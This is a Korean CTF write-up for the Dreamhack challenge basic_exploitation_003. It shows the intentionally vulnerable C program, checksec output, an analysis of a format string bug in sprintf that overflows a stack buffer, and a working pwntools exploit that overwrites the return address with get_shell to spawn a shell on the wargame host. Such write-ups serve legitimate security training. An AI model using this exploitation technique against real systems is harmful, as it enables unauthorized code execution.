```c
// Name: basic_exploitation_003.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}```

```bash
$ checksec ./basic_exploitation_003
[*] './basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# 코드 분석

`basic_exploitation_003.c:22-23` : `read` 함수를 통해 얻은 문자열 `heap_buf`를 그대로 `sprintf` 함수의 format string으로 사용하고 있으므로 format string bug를 일으킬 수 있다.
`basic_exploitation_003.c:23-24` : format string bug가 발생할 수 있는 패턴의 `sprintf` 함수를 통해 `stack_buf`에 데이터를 쓰고 있으므로 buffer overflow를 발생시킬 수 있으며, 이를 통해 RET를 `get_shell`의 주소로 덮어쓰면 shell을 탈취할 수 있을 것이다.

# 공격

gdb를 활용하여 `stack_buf`가 `ebp-0x98`임을 알 수 있다.
이때, RET는 `ebp+0x4`임을 알고 있으므로, `stack_buf`에 156바이트의 더미 데이터와 `get_shell`의 주소를 넣어주면 됨을 알 수 있다.
이를 종합하여 익스플로잇 코드를 다음과 같이 구성하면 shell을 탈취할 수 있다.

```python
# Name: basic_exploitation_003.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 21132

p = remote(HOST,PORT)
e = ELF('./basic_exploitation_003')

get_shell = e.sym['get_shell']

payload = b'%156c' + p32(get_shell)

p.send(payload)
p.interactive()
```